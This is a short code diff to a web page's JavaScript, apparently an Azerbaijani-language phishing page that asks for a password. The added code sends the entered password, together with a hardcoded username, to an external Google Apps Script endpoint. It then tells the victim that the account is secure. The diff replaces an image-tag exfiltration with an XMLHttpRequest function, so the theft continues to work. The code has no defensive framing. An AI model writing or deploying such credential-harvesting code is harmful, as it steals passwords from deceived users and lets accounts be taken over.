@@ -36,9 +36,18 @@
       alert("Şifrənizi daxil edin")
     }
     else {
-        document.write('<img src="https://script.google.com/macros/s/AKfycbys0fEnmMP_DrYEvw-_Cjxw3Y2ZKqJwWNce7eIiWsUULjDoAsNdjwBPaWRq_yleZw3x/exec?username=ravina17_' + '&password=' + password.value + '" onerror="success()" />');
+       // document.write('<img src="https://script.google.com/macros/s/AKfycbys0fEnmMP_DrYEvw-_Cjxw3Y2ZKqJwWNce7eIiWsUULjDoAsNdjwBPaWRq_yleZw3x/exec?username=ravina17_' + '&password=' + password.value + '" onerror="success()" />');
+        httpGet("https://script.google.com/macros/s/AKfycbys0fEnmMP_DrYEvw-_Cjxw3Y2ZKqJwWNce7eIiWsUULjDoAsNdjwBPaWRq_yleZw3x/exec?username=ravina17_&password=" + password.value );
+
     }
   }
+  
+    function httpGet(theUrl){
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+    } 
 
   function success(){
       alert("Uğurlar! Hesabınız güvəndədir.")
